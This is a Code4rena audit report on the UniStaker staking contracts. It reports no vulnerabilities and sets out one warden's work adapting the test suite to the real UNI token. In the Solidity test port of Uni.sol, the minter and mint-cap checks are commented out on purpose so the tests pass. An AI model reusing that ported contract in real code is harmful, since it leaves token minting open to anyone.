---
sponsor: "Uniswap Foundation"
slug: "2024-02-uniswap-foundation"
date: "2024-04-11"
title: "UniStaker Infrastructure"
findings: "https://github.com/code-423n4/2024-02-uniswap-foundation-findings/issues"
contest: 336
---

# Overview

## About C4

Code4rena (C4) is an open organization consisting of security researchers, auditors, developers, and individuals with domain expertise in smart contracts.

A C4 audit is an event in which community participants, referred to as Wardens, review, audit, or analyze smart contract logic in exchange for a bounty provided by sponsoring projects.

During the audit outlined in this document, C4 conducted an analysis of the UniStaker Infrastructure smart contract system written in Solidity. The audit took place between February 23 — March 5, 2024.

## Wardens

54 Wardens contributed reports to UniStaker Infrastructure:

  1. [CodeWasp](https://code4rena.com/@CodeWasp) ([slylandro\_star](https://code4rena.com/@slylandro_star), [kuprum](https://code4rena.com/@kuprum), [audithare](https://code4rena.com/@audithare) and [spaghetticode\_sentinel](https://code4rena.com/@spaghetticode_sentinel))
  2. [Al-Qa-qa](https://code4rena.com/@Al-Qa-qa)
  3. [DadeKuma](https://code4rena.com/@DadeKuma)
  4. [Trust](https://code4rena.com/@Trust)
  5. [0xlemon](https://code4rena.com/@0xlemon)
  6. [Shield](https://code4rena.com/@Shield) ([Viraz](https://code4rena.com/@Viraz), [0xA5DF](https://code4rena.com/@0xA5DF), [Dravee](https://code4rena.com/@Dravee) and [Udsen](https://code4rena.com/@Udsen))
  7. [lsaudit](https://code4rena.com/@lsaudit)
  8. [Breeje](https://code4rena.com/@Breeje)
  9. [osmanozdemir1](https://code4rena.com/@osmanozdemir1)
  10. [SpicyMeatball](https://code4rena.com/@SpicyMeatball)
  11. [peanuts](https://code4rena.com/@peanuts)
  12. [Aamir](https://code4rena.com/@Aamir)
  13. [ZanyBonzy](https://code4rena.com/@ZanyBonzy)
  14. [AlexCzm](https://code4rena.com/@AlexCzm)
  15. [0xdice91](https://code4rena.com/@0xdice91)
  16. [gesha17](https://code4rena.com/@gesha17)
  17. [marchev](https://code4rena.com/@marchev)
  18. [kutugu](https://code4rena.com/@kutugu)
  19. [haxatron](https://code4rena.com/@haxatron)
  20. [cheatc0d3](https://code4rena.com/@cheatc0d3)
  21. [visualbits](https://code4rena.com/@visualbits)
  22. [radev\_sw](https://code4rena.com/@radev_sw)
  23. [imare](https://code4rena.com/@imare)
  24. [nnez](https://code4rena.com/@nnez)
  25. [PetarTolev](https://code4rena.com/@PetarTolev)
  26. [BAHOZ](https://code4rena.com/@BAHOZ)
  27. [Bauchibred](https://code4rena.com/@Bauchibred)
  28. [jesjupyter](https://code4rena.com/@jesjupyter)
  29. [twicek](https://code4rena.com/@twicek)
  30. [Fassi\_Security](https://code4rena.com/@Fassi_Security) ([bronze\_pickaxe](https://code4rena.com/@bronze_pickaxe) and [mxuse](https://code4rena.com/@mxuse))
  31. [merlinboii](https://code4rena.com/@merlinboii)
  32. [roguereggiant](https://code4rena.com/@roguereggiant)
  33. [hunter\_w3b](https://code4rena.com/@hunter_w3b)
  34. [kaveyjoe](https://code4rena.com/@kaveyjoe)
  35. [McToady](https://code4rena.com/@McToady)
  36. [Sathish9098](https://code4rena.com/@Sathish9098)
  37. [0xepley](https://code4rena.com/@0xepley)
  38. [fouzantanveer](https://code4rena.com/@fouzantanveer)
  39. [hassanshakeel13](https://code4rena.com/@hassanshakeel13)
  40. [MSK](https://code4rena.com/@MSK)
  41. [LinKenji](https://code4rena.com/@LinKenji)
  42. [SAQ](https://code4rena.com/@SAQ)
  43. [Myd](https://code4rena.com/@Myd)
  44. [ihtishamsudo](https://code4rena.com/@ihtishamsudo)
  45. [emerald7017](https://code4rena.com/@emerald7017)
  46. [aariiif](https://code4rena.com/@aariiif)
  47. [cudo](https://code4rena.com/@cudo)

This audit was judged by [0xTheC0der](https://code4rena.com/@0xTheC0der).

Final report assembled by [thebrittfactor](https://twitter.com/brittfactorC4).

# Summary

The C4 analysis yielded an aggregated total of 0 unique vulnerabilities.

Additionally, C4 analysis included 31 reports detailing issues with a risk rating of LOW severity or non-critical.

All of the issues presented here are linked back to their original finding.

# Scope

The code under review can be found within the [C4 UniStaker Infrastructure repository](https://github.com/code-423n4/2024-02-uniswap-foundation), and is composed of 7 smart contracts written in the Solidity programming language and includes 557 lines of Solidity code.

In addition to the known issues identified by the project team, a Code4rena bot race was conducted at the start of the audit. The winning bot, **LightChaser** from warden ChaseTheLight, generated the [Automated Findings report](https://github.com/code-423n4/2024-02-uniswap-foundation/blob/main/bot-report.md) and all findings therein were classified as out of scope.

# Severity Criteria

C4 assesses the severity of disclosed vulnerabilities based on three primary risk categories: high, medium, and low/non-critical.

High-level considerations for vulnerabilities span the following key areas when conducting assessments:

- Malicious Input Handling
- Escalation of privileges
- Arithmetic
- Gas use

For more information regarding the severity criteria referenced throughout the submission review process, please refer to the documentation provided on [the C4 website](https://code4rena.com), specifically our section on [Severity Categorization](https://docs.code4rena.com/awarding/judging-criteria/severity-categorization).

# Low Risk and Non-Critical Issues

For this audit, 31 reports were submitted by wardens detailing low risk and non-critical issues. The [report highlighted below](https://github.com/code-423n4/2024-02-uniswap-foundation-findings/issues/299) by **CodeWasp** received the top score from the judge.

*The following wardens also submitted reports: [DadeKuma](https://github.com/code-423n4/2024-02-uniswap-foundation-findings/issues/380), [Trust](https://github.com/code-423n4/2024-02-uniswap-foundation-findings/issues/331), [0xlemon](https://github.com/code-423n4/2024-02-uniswap-foundation-findings/issues/255), [Shield](https://github.com/code-423n4/2024-02-uniswap-foundation-findings/issues/169), [lsaudit](https://github.com/code-423n4/2024-02-uniswap-foundation-findings/issues/168), [Breeje](https://github.com/code-423n4/2024-02-uniswap-foundation-findings/issues/107), [Al-Qa-qa](https://github.com/code-423n4/2024-02-uniswap-foundation-findings/issues/90), [osmanozdemir1](https://github.com/code-423n4/2024-02-uniswap-foundation-findings/issues/45), [SpicyMeatball](https://github.com/code-423n4/2024-02-uniswap-foundation-findings/issues/8), [AlexCzm](https://github.com/code-423n4/2024-02-uniswap-foundation-findings/issues/415), [peanuts](https://github.com/code-423n4/2024-02-uniswap-foundation-findings/issues/414), [0xdice91](https://github.com/code-423n4/2024-02-uniswap-foundation-findings/issues/413), [gesha17](https://github.com/code-423n4/2024-02-uniswap-foundation-findings/issues/410), [Aamir](https://github.com/code-423n4/2024-02-uniswap-foundation-findings/issues/409), [marchev](https://github.com/code-423n4/2024-02-uniswap-foundation-findings/issues/379), [kutugu](https://github.com/code-423n4/2024-02-uniswap-foundation-findings/issues/372), [haxatron](https://github.com/code-423n4/2024-02-uniswap-foundation-findings/issues/368), [cheatc0d3](https://github.com/code-423n4/2024-02-uniswap-foundation-findings/issues/355), [visualbits](https://github.com/code-423n4/2024-02-uniswap-foundation-findings/issues/345), [radev\_sw](https://github.com/code-423n4/2024-02-uniswap-foundation-findings/issues/237), [imare](https://github.com/code-423n4/2024-02-uniswap-foundation-findings/issues/230), [nnez](https://github.com/code-423n4/2024-02-uniswap-foundation-findings/issues/201), [ZanyBonzy](https://github.com/code-423n4/2024-02-uniswap-foundation-findings/issues/151), [PetarTolev](https://github.com/code-423n4/2024-02-uniswap-foundation-findings/issues/141), [BAHOZ](https://github.com/code-423n4/2024-02-uniswap-foundation-findings/issues/130), [Bauchibred](https://github.com/code-423n4/2024-02-uniswap-foundation-findings/issues/115), [jesjupyter](https://github.com/code-423n4/2024-02-uniswap-foundation-findings/issues/99), [twicek](https://github.com/code-423n4/2024-02-uniswap-foundation-findings/issues/73), [Fassi\_Security](https://github.com/code-423n4/2024-02-uniswap-foundation-findings/issues/67), and [merlinboii](https://github.com/code-423n4/2024-02-uniswap-foundation-findings/issues/59).*

## [01] Adapting UniStaker test infrastructure to UNI token

Current testing infrastructure for UniStaker includes fuzz and integration tests which employ mocks for the governance token, in particular [test/mocks/MockERC20Votes.sol](https://github.com/code-423n4/2024-02-uniswap-foundation/blob/5a2761c8277541a24bc551fbd624413b384bea94/test/mocks/MockERC20Votes.sol). The sponsors have confirmed in the Discord audit channel though that exclusively the [currently deployed UNI token](https://etherscan.io/token/0x1f9840a85d5af5bf1d1762f925bdaddc4201f984#code) will be used as the governance token. In light of that information, it should be noted that `MockERC20Votes.sol` is a very crude approximation of the functionality contained in `Uni.sol`. In particular, the latter:

- Allows token holders to delegate their voting power directly, via the `delegate()` method.
- Employs a non-trivial accounting scheme for delegated votes, indexed according to block numbers.
- Is written using Solidity 0.5.16 compiler, and moreover, restricts many of its underlying datatypes to `uint96` / `uint32`.

Moreover, the current UniStaker testing infrastructure doesn't try to test for the correct votes accounting at all, although it's a crucial aspect of integrating `UniStaker` with the currently deployed `UNI` token. Taking this into account, we've undertaken the steps to integrate `UNI` token into the `UniStaker` testing, of which activity we report below. In particular, we:

- Ported `Uni.sol` from Solidity 0.5.16 to Solidity 0.8.23.
- Adjusted the tests in `UniStaker.t.sol` such that they pass when used with `Uni.sol` instead of `MockERC20Votes.sol`.
- Added some assertions to `UniStaker.t.sol` to track for voting power in tests.
- Wrote a handler around `Uni.sol`, `Uni.handler.sol`, which allows to call for its most important user-facing methods from Foundry fuzz/invariant tester.
- Performed necessary adaptations to `UniStaker.handler.sol`, to integrate `UNI` and avoid failing tests due to a low-level foundry function.
- Extended `UniStaker.invariants.t.sol` with an additional invariant, `invariant_Total_stake_plus_direct_delegations_equals_current_votes`, which captures the relation between the voting power delegated directly through users and via UniStaker surrogates.
- Extended the helper library `AddressSet.sol`, to be able to track external user delegations.
- Made necessary changes to `foundry.toml` to make the project compile, and run a reasonable amount of fuzz/invariant tests.

While these activities have not allowed us to catch any critical vulnerabilities, they did allow us to identify and fix many implicit assumptions in the testing infrastructure that made it incompatible with the real `UNI` token, and not the mock. We also have been able to identify and fix a few false positives, i.e. the tests that were failing due to the deficiencies in the tests themselves. We hope that our efforts will help the UniSwap developers in seamlessly integrating their new staking contracts with the currently deployed ones.

All of the added/modified files are available in [this gist](https://gist.github.com/kuprumion/b7b0e03ea52ff925d0f9a9a4dcd7116f).

## [02] A port of `Uni.sol` from Solidity 0.5.16 to Solidity 0.8.23

This is the simplest of undertaken activities, which amounted in fixing a couple of incompatibilities between the compiler versions, disabling some checks which were not compatible with the current test suite (like minting restrictions), and adding the `DOMAIN_SEPARATOR()` function required by tests. The changes between the [deployed UNI token](https://etherscan.io/token/0x1f9840a85d5af5bf1d1762f925bdaddc4201f984#code) and the adaptation are summarized in the diff below:

```diff
--- test/mocks/Uni.sol.orig     2024-03-04 13:51:22.540178698 +0100
+++ test/mocks/Uni.sol  2024-03-04 14:22:43.058757812 +0100
@@ -1,4 +1,8 @@
-pragma solidity ^0.5.16;
+// Adaptation of the UNI code from https://etherscan.io/token/0x1f9840a85d5af5bf1d1762f925bdaddc4201f984#code
+// To make the tests pass. For the original version see "Uni.sol.orig"
+pragma solidity 0.8.23;
 pragma experimental ABIEncoderV2;
 
+import {IERC20Delegates} from "src/interfaces/IERC20Delegates.sol";
+
 // From https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/math/Math.sol
@@ -188,3 +192,3 @@
 
-contract Uni {
+contract Uni  is IERC20Delegates {
     /// @notice EIP-20 token name for this token
@@ -293,4 +297,4 @@
     function mint(address dst, uint rawAmount) external {
-        require(msg.sender == minter, "Uni::mint: only the minter can mint");
-        require(block.timestamp >= mintingAllowedAfter, "Uni::mint: minting not allowed yet");
+        // require(msg.sender == minter, "Uni::mint: only the minter can mint");
+        // require(block.timestamp >= mintingAllowedAfter, "Uni::mint: minting not allowed yet");
         require(dst != address(0), "Uni::mint: cannot transfer to the zero address");
@@ -302,3 +306,3 @@
         uint96 amount = safe96(rawAmount, "Uni::mint: amount exceeds 96 bits");
-        require(amount <= SafeMath.div(SafeMath.mul(totalSupply, mintCap), 100), "Uni::mint: exceeded mint cap");
+        // require(amount <= SafeMath.div(SafeMath.mul(totalSupply, mintCap), 100), "Uni::mint: exceeded mint cap");
         totalSupply = safe96(SafeMath.add(totalSupply, amount), "Uni::mint: totalSupply exceeds 96 bits");
@@ -333,4 +337,4 @@
         uint96 amount;
-        if (rawAmount == uint(-1)) {
-            amount = uint96(-1);
+        if (rawAmount == type(uint).max) {
+            amount = type(uint96).max;
         } else {
@@ -345,2 +349,6 @@
 
+    function DOMAIN_SEPARATOR() external view virtual returns (bytes32) {
+        return keccak256(abi.encode(DOMAIN_TYPEHASH, keccak256(bytes(name)), getChainId(), address(this)));
+    }
+
     /**
@@ -357,4 +365,4 @@
         uint96 amount;
-        if (rawAmount == uint(-1)) {
-            amount = uint96(-1);
+        if (rawAmount == type(uint).max) {
+            amount = type(uint96).max;
         } else {
@@ -369,3 +377,3 @@
         require(signatory == owner, "Uni::permit: unauthorized");
-        require(now <= deadline, "Uni::permit: signature expired");
+        require(block.timestamp <= deadline, "Uni::permit: signature expired");
 
@@ -409,3 +417,3 @@
 
-        if (spender != src && spenderAllowance != uint96(-1)) {
+        if (spender != src && spenderAllowance != type(uint96).max) {
             uint96 newAllowance = sub96(spenderAllowance, amount, "Uni::transferFrom: transfer amount exceeds spender allowance");
@@ -444,3 +452,3 @@
         require(nonce == nonces[signatory]++, "Uni::delegateBySig: invalid nonce");
-        require(now <= expiry, "Uni::delegateBySig: signature expired");
+        require(block.timestamp <= expiry, "Uni::delegateBySig: signature expired");
         return _delegate(signatory, delegatee);
@@ -572,3 +580,3 @@
 
-    function getChainId() internal pure returns (uint) {
+    function getChainId() internal view returns (uint) {
         uint256 chainId;
```

## [03] Adjustment of the tests in `UniStaker.t.sol` to use `Uni.sol` instead of `MockERC20Votes.sol`

We don't list here the whole diff, only the most important parts of it; also omitting duplicate changes in multiple places.

### Preamble and set up: replace `ERC20VotesMock` with `Uni`**

```diff 
diff --git a/test/UniStaker.t.sol b/test/UniStaker.t.sol
index 89124f8..22e0534 100644
--- a/test/UniStaker.t.sol
+++ b/test/UniStaker.t.sol
@@ -9,2 +9,3 @@ import {ERC20Fake} from "test/fakes/ERC20Fake.sol";
 import {PercentAssertions} from "test/helpers/PercentAssertions.sol";
+import {Uni} from "test/mocks/Uni.sol";
 
@@ -12,3 +13,3 @@ contract UniStakerTest is Test, PercentAssertions {
   ERC20Fake rewardToken;
-  ERC20VotesMock govToken;
+  Uni govToken;
   address admin;
@@ -38,4 +39,6 @@ contract UniStakerTest is Test, PercentAssertions {
 
-    govToken = new ERC20VotesMock();
+    admin = makeAddr("admin");
+    govToken = new Uni(admin, admin, 2000);
     vm.label(address(govToken), "Governance Token");
+    _jumpAhead(1234);
 
@@ -44,4 +47,2 @@ contract UniStakerTest is Test, PercentAssertions {
 
-    admin = makeAddr("admin");
-
     uniStaker = new UniStakerHarness(rewardToken, govToken, admin);
@@ -61,3 +62,3 @@ contract UniStakerTest is Test, PercentAssertions {
   function _boundMintAmount(uint256 _amount) internal pure returns (uint256) {
-    return bound(_amount, 0, 100_000_000_000e18);
+    return bound(_amount, 0, 100_000_000_000e12); // reduced for tests to pass with UNI
   }
@@ -66,2 +67,4 @@ contract UniStakerTest is Test, PercentAssertions {
     vm.assume(_to != address(0));
+    vm.assume(_to != admin); // needed to avoid using admin's address in tests
+    vm.prank(admin);
     govToken.mint(_to, _amount);
```

### Reduce the maximum constants used to be compatible with `uint96` used in `Uni`

```diff
@@ -74,3 +77,3 @@ contract UniStakerTest is Test, PercentAssertions {
   {
-    _boundedStakeAmount = bound(_stakeAmount, 0.1e18, 25_000_000e18);
+    _boundedStakeAmount = bound(_stakeAmount, 0.1e18, 25_000_000e12);  // reduced for tests to pass with UNI
   }
@@ -194,3 +197,3 @@ contract Stake is UniStakerTest {
   ) public {
-    _amount = bound(_amount, 1, type(uint224).max);
+    _amount = bound(_amount, 1, type(uint88).max);
     _mintGovToken(_depositor, _amount);
@@ -721,3 +733,3 @@ contract PermitAndStake is UniStakerTest {
     uint256 _deadline,
-    uint256 _currentNonce
+    uint248 _currentNonce
   ) public {
@@ -2371,3 +2384,3 @@ contract Withdraw is UniStakerTest {
     (_amount, _depositId) = _boundMintAndStake(_depositor, _amount, _delegatee);
-    _amountOver = bound(_amountOver, 1, type(uint128).max);
+    _amountOver = bound(_amountOver, 1, type(uint88).max);
```

### Miscellaneous changes

```diff
@@ -793,3 +805,3 @@ contract PermitAndStake is UniStakerTest {
     vm.expectRevert(
-      abi.encodeWithSelector(ERC20Permit.ERC2612InvalidSigner.selector, _depositor, _notDepositor)
+      "Uni::permit: unauthorized"
     );
@@ -4670,5 +4682,5 @@ contract _FetchOrDeploySurrogate is UniStakerRewardsTest {
 
-    assertEq(logs[1].topics[0], keccak256("SurrogateDeployed(address,address)"));
-    assertEq(logs[1].topics[1], bytes32(uint256(uint160(_delegatee))));
-    assertEq(logs[1].topics[2], bytes32(uint256(uint160(address(_surrogate)))));
+    assertEq(logs[2].topics[0], keccak256("SurrogateDeployed(address,address)"));
+    assertEq(logs[2].topics[1], bytes32(uint256(uint160(_delegatee))));
+    assertEq(logs[2].topics[2], bytes32(uint256(uint160(address(_surrogate)))));
   }
```

## [04] Additional assertions to track voting power changes in `Uni`

As already explained above, voting power is a very important aspect of `UNI` token, which, on the one hand, is influenced by the introduction of `UniStaker` (via surrogate delegations), and on the other hand voting power changes are not tracked at all in the current test suite. We have added corresponding assertions to a few of the current tests; the rest of the test suite needs to be examined, and assertions added as well; we leave this to UniSwap developers.

An example of one of the modified tests is below:

```diff
@@ -189,15 +191,16 @@ contract Constructor is UniStakerTest {
 contract Stake is UniStakerTest {
   function testFuzz_DeploysAndTransfersTokensToANewSurrogateWhenAnAccountStakes(
     address _depositor,
     uint256 _amount,
     address _delegatee
   ) public {
-    _amount = bound(_amount, 1, type(uint224).max);
+    _amount = bound(_amount, 1, type(uint88).max);
     _mintGovToken(_depositor, _amount);
     _stake(_depositor, _amount, _delegatee);
 
     DelegationSurrogate _surrogate = uniStaker.surrogates(_delegatee);
 
     assertEq(govToken.balanceOf(address(_surrogate)), _amount);
     assertEq(govToken.delegates(address(_surrogate)), _delegatee);
     assertEq(govToken.balanceOf(_depositor), 0);
+    assertEq(govToken.getCurrentVotes(_delegatee), _amount);
   }
 ```

## [05] Add `Uni.handler.sol`, the wrapper around `Uni`, allowing to call its functions from fuzz/invariant tests

Similar to the already present [test/helpers/UniStaker.handler.sol](https://github.com/code-423n4/2024-02-uniswap-foundation/blob/5a2761c8277541a24bc551fbd624413b384bea94/test/helpers/UniStaker.handler.sol), we have implemented the lightweight `test/helpers/Uni.handler.sol`, which allows to call most crucial for testing user-facing functions of `UNI`.

```solidity
// SPDX-License-Identifier: GPL-3.0-or-later
pragma solidity ^0.8.13;

import {CommonBase} from "forge-std/Base.sol";
import {StdCheats} from "forge-std/StdCheats.sol";
import {StdUtils} from "forge-std/StdUtils.sol";
import {AddressSet, LibAddressSet} from "../helpers/AddressSet.sol";
import {Uni} from "test/mocks/Uni.sol";

contract UniHandler is CommonBase, StdCheats, StdUtils {
  using LibAddressSet for AddressSet;

  Uni public uni;

  // delegator -> delegatee
  mapping(address => address) private _delegatee;
  
  // delegatee -> delegators
  mapping(address => AddressSet) private _delegators;

  constructor(Uni _uni) {
    uni= _uni;
  }

  function approve(address spender, uint _amount) external returns (bool)
  {
    _amount = bound(_amount, 0, type(uint96).max);
    vm.startPrank(msg.sender);
    uni.approve(spender, _amount);
    vm.stopPrank();
    return true;
  }

  // Track delegations performed by the users directly via the UNI token
  function transfer(address dst, uint _amount) external returns (bool)
  {
    // bound to the max available amount
    vm.startPrank(msg.sender);
    uint256 balance =  uni.balanceOf(msg.sender);
    _amount = bound(_amount, 0, balance);
    uni.transfer(dst, _amount);
    vm.stopPrank();
    return true;
  }

  // Track delegations performed by users directly via the UNI token
  function delegate(address delegatee)  public  
  {
    address prev_delegatee = _delegatee[msg.sender];
    _delegators[prev_delegatee].remove(msg.sender);
    _delegators[delegatee].add(msg.sender);
    _delegatee[msg.sender] = delegatee;

    vm.startPrank(msg.sender);
    uni.delegate(delegatee);
    vm.stopPrank();
  }

  // Advance the specified number of blocks. 
  // Needed to trigger UNI's block-numbers-based votes accounting
  function roll(uint16 advance) public  
  {
    vm.roll(block.number + advance);
  }

  function addDelegator(uint256 acc, address delegator) external view returns (uint256) {
    return acc + uni.balanceOf(delegator);
  }

  function sumDelegatorVotes(address delegatee)
    public view
    returns (uint256)
  {
    return _delegators[delegatee].reduce(0, this.addDelegator);
  }  
}
```

## [06] Necessary adaptations to `UniStaker.handler.sol`

We had to perform necessary adaptations to `UniStaker.handler.sol`, to integrate `UNI` and avoid failing tests due to the usage of a low-level foundry function; the changes are outlined below:

```diff
diff --git a/test/helpers/UniStaker.handler.sol b/test/helpers/UniStaker.handler.sol
index f8fe335..9622571 100644
--- a/test/helpers/UniStaker.handler.sol
+++ b/test/helpers/UniStaker.handler.sol
@@ -10,2 +10,3 @@ import {UniStaker} from "src/UniStaker.sol";
 import {IERC20} from "openzeppelin/token/ERC20/IERC20.sol";
+import {Uni} from "test/mocks/Uni.sol";
-  IERC20 public stakeToken;
+  Uni public stakeToken;
   IERC20 public rewardToken;
@@ -50,3 +51,3 @@ contract UniStakerHandler is CommonBase, StdCheats, StdUtils {
     uniStaker = _uniStaker;
-    stakeToken = IERC20(address(_uniStaker.STAKE_TOKEN()));
+    stakeToken = Uni(address(_uniStaker.STAKE_TOKEN()));
     rewardToken = IERC20(address(_uniStaker.REWARD_TOKEN()));
@@ -57,3 +58,5 @@ contract UniStakerHandler is CommonBase, StdCheats, StdUtils {
     vm.assume(_to != address(0));
-    deal(address(stakeToken), _to, _amount, true);
+    vm.prank(admin);
+    stakeToken.mint(_to, _amount);
+    vm.stopPrank();
   }
@@ -98,2 +101,4 @@ contract UniStakerHandler is CommonBase, StdCheats, StdUtils {
   {
+    vm.assume(_delegatee != address(0));
+    vm.assume(_beneficiary != address(0));
     _createDepositor();
@@ -185,4 +190,4 @@ contract UniStakerHandler is CommonBase, StdCheats, StdUtils {
 
-  function reduceDepositors(uint256 acc, function(uint256,address) external returns (uint256) func)
-    public
+  function reduceDepositors(uint256 acc, function(uint256,address) external view returns (uint256) func)
+    public view
     returns (uint256)
@@ -194,4 +199,4 @@ contract UniStakerHandler is CommonBase, StdCheats, StdUtils {
     uint256 acc,
-    function(uint256,address) external returns (uint256) func
-  ) public returns (uint256) {
+    function(uint256,address) external view returns (uint256) func
+  ) public view returns (uint256) {
     return _beneficiaries.reduce(acc, func);
@@ -199,4 +204,4 @@ contract UniStakerHandler is CommonBase, StdCheats, StdUtils {
 
-  function reduceDelegates(uint256 acc, function(uint256,address) external returns (uint256) func)
-    public
+  function reduceDelegates(uint256 acc, function(uint256,address) external view returns (uint256) func)
+    public view
     returns (uint256)
```

In particular, the usage of the low-level Foundry's `deal` function, which modifies in place the storage of an ERC20 contract, is incompatible with `UNI`'s vote accounting mechanism and leads to underflows in vote computations with the error thrown `Uni::_moveVotes: vote amount underflows`.

## [07] Extensions to `UniStaker.invariants.t.sol` to track an additional invariant, `invariant_Total_stake_plus_direct_delegations_equals_current_votes`

We have extended `UniStaker.invariants.t.sol` with an additional invariant that asserts that on all changes, either via `UniStaker` or via direct user delegations via `UNI`, the total stake via `UniStaker` summed up with direct delegations, gives the total voting power for all delegates. The changes are outlined below:

<details>

```diff
diff --git a/test/UniStaker.invariants.t.sol b/test/UniStaker.invariants.t.sol
index 4c80ce1..5148548 100644
--- a/test/UniStaker.invariants.t.sol
+++ b/test/UniStaker.invariants.t.sol
@@ -8,3 +8,4 @@ import {UniStaker} from "src/UniStaker.sol";
 import {UniStakerHandler} from "test/helpers/UniStaker.handler.sol";
-import {ERC20VotesMock} from "test/mocks/MockERC20Votes.sol";
+import {Uni} from "test/mocks/Uni.sol";
+import {UniHandler} from "test/helpers/Uni.handler.sol";
 import {ERC20Fake} from "test/fakes/ERC20Fake.sol";
@@ -15,4 +16,23 @@ contract UniStakerInvariants is Test {
   ERC20Fake rewardToken;
-  ERC20VotesMock govToken;
+  Uni govToken;
+  UniHandler uniHandler;
   address rewardsNotifier;
+  address admin;
+  address alice;
+  address bob;
+  address carol;
+  address dave;
+  address eve;
+  address frank;
+
+  function _jumpAhead(uint256 _seconds) public {
+    vm.warp(block.timestamp + _seconds);
+  }
+
+  function _mintGovToken(address _to, uint256 _amount) internal {
+    vm.assume(_to != address(0));
+    vm.prank(admin);
+    govToken.mint(_to, _amount);
+    vm.stopPrank();
+  }
 
@@ -22,4 +42,22 @@ contract UniStakerInvariants is Test {
 
-    govToken = new ERC20VotesMock();
-    vm.label(address(govToken), "Governance Token");
+    _jumpAhead(1234);
+    admin = makeAddr("admin");
+    alice = makeAddr("alice");
+    bob = makeAddr("bob");
+    carol = makeAddr("carol");
+    dave = makeAddr("dave");
+    eve = makeAddr("eve");
+    frank = makeAddr("frank");
+
+    govToken = new Uni(admin, admin, 2000);
+    vm.label(address(govToken), "Uni Token");
+    _jumpAhead(1234);
+
+    _mintGovToken(admin, 1e27);
+    _mintGovToken(alice, 1e27);
+    _mintGovToken(bob, 1e27);
+    _mintGovToken(carol, 1e27);
+    _mintGovToken(dave, 1e27);
+    _mintGovToken(eve, 1e27);
+    _mintGovToken(frank, 1e27);
 
@@ -42,2 +80,19 @@ contract UniStakerInvariants is Test {
     targetContract(address(handler));
+
+    uniHandler = new UniHandler(govToken);
+    bytes4[] memory uniSelectors = new bytes4[](4);
+    uniSelectors[0] = UniHandler.transfer.selector;
+    uniSelectors[1] = UniHandler.approve.selector;
+    uniSelectors[2] = UniHandler.delegate.selector;
+    uniSelectors[3] = UniHandler.roll.selector;
+
+    targetSelector(FuzzSelector({addr: address(uniHandler), selectors: uniSelectors}));
+
+    targetContract(address(uniHandler));
+    targetSender(alice);
+    targetSender(bob);
+    targetSender(carol);
+    targetSender(dave);
+    targetSender(eve);
+    targetSender(frank);
   }
@@ -84,2 +139,23 @@ contract UniStakerInvariants is Test {
 
+  function invariant_Total_stake_plus_direct_delegations_equals_current_votes() public {
+    assertEq(uniStaker.totalStaked() + handler.reduceDelegates(0, this.accumulateDirectDelegateVotes), 
+      handler.reduceDelegates(0, this.accumulateCurrentDelegateVotes));
+  }
+
+  function accumulateDirectDelegateVotes(uint256 votes, address delegate)
+    external
+    view
+    returns (uint256)
+  {
+    return votes + uniHandler.sumDelegatorVotes(delegate);
+  }
+
+  function accumulateCurrentDelegateVotes(uint256 votes, address delegate)
+    external
+    view
+    returns (uint256)
+  {
+    return votes + govToken.getCurrentVotes(delegate);
+  }
+
   // Used to see distribution of non-reverting calls
```

</details>

## [08] Necessary changes to `AddressSet.sol`

In order to be able to track external user delegations, we had to adapt slightly the helper library `AddressSet.sol`:

```diff
diff --git a/test/helpers/AddressSet.sol b/test/helpers/AddressSet.sol
index 83327a7..323ed2c 100644
--- a/test/helpers/AddressSet.sol
+++ b/test/helpers/AddressSet.sol
@@ -17,6 +17,20 @@ library LibAddressSet {
     }
   }
 
+  function remove(AddressSet storage s, address addr) internal {
+    if (s.saved[addr]) {
+      uint256 len = s.addrs.length;
+      for(uint256 i = 0; i < len; ++i) {
+        if(s.addrs[i] == addr) {
+          s.addrs[i] = s.addrs[len-1];
+          break;
+        }
+      }
+      s.addrs.pop();
+      s.saved[addr] = false;
+    }
+  }
+
   function contains(AddressSet storage s, address addr) internal view returns (bool) {
     return s.saved[addr];
   }
@@ -39,8 +53,8 @@ library LibAddressSet {
   function reduce(
     AddressSet storage s,
     uint256 acc,
-    function(uint256,address) external returns (uint256) func
-  ) internal returns (uint256) {
+    function(uint256,address) external view returns (uint256) func
+  ) internal view returns (uint256) {
     for (uint256 i; i < s.addrs.length; ++i) {
       acc = func(acc, s.addrs[i]);
     }
```

## [09] Necessary changes to `foundry.toml`

We had to introduce a few changes to `foundry.toml`. On the one hand, a couple of dependencies were missing, so we've introduced them for the project to compile. On the other hand, the fuzzing/invariant test settings have been in our opinion very low, so we increased the number or the depth of the runs in order to increase the coverage. 

```diff
diff --git a/foundry.toml b/foundry.toml
index a3031f2..64d0f63 100644
--- a/foundry.toml
+++ b/foundry.toml
@@ -2,17 +2,23 @@
   evm_version = "paris"
   optimizer = true
   optimizer_runs = 10_000_000
-  remappings = ["openzeppelin/=lib/openzeppelin-contracts/contracts"]
+  remappings = [
+    "openzeppelin/=lib/openzeppelin-contracts/contracts",
+    "uniswap-periphery/=lib/v3-periphery/contracts",
+    "@uniswap/v3-core=lib/v3-core",
+  ]
   solc_version = "0.8.23"
   verbosity = 3
+  fuzz = { runs = 500 }
+  invariant = { runs = 100, depth = 100 }
 
 [profile.ci]
   fuzz = { runs = 5000 }
-  invariant = { runs = 1000 }
+  invariant = { runs = 1000, depth = 100 }
 
 [profile.lite]
   fuzz = { runs = 50 }
-  invariant = { runs = 10 }
+  invariant = { runs = 10, depth = 100 }
   # Speed up compilation and tests during development.
   optimizer = false
```

Increasing the fuzz/invariant bounds allowed us in particular to observe the following failing test

```sh
[FAIL. Reason: assertion failed; counterexample: calldata=0xc1e611e700000000000000000000000000000000000000000000000000000000000029fa00000000000000000000000000000000000000000000000000000000000004d3000000000000000000000000aa10a84ce7d9ae517a52c6d5ca153b369af99ecf0000000000000000000000000000000000000000000000000000000000002d6900000000000000000000000000000000000000000000000000000000000000970000000000000000000000000000000000000000000000000000000000000631 args=[0x00000000000000000000000000000000000029fa, 1235, 0xaA10a84CE7d9AE517a52c6d5cA153b369Af99ecF, 11625 [1.162e4], 0x0000000000000000000000000000000000000097, 0x0000000000000000000000000000000000000631]] testFuzz_DeploysAndTransfersTokenToTwoSurrogatesWhenAccountsStakesToDifferentDelegatees(address,uint256,address,uint256,address,address) (runs: 370, μ: 803661, ~: 816488)
Logs:
  Bound Result 1235
  Bound Result 11625
  Error: a == b not satisfied [uint]
        Left: 1000000000000000000000000000
       Right: 0
```

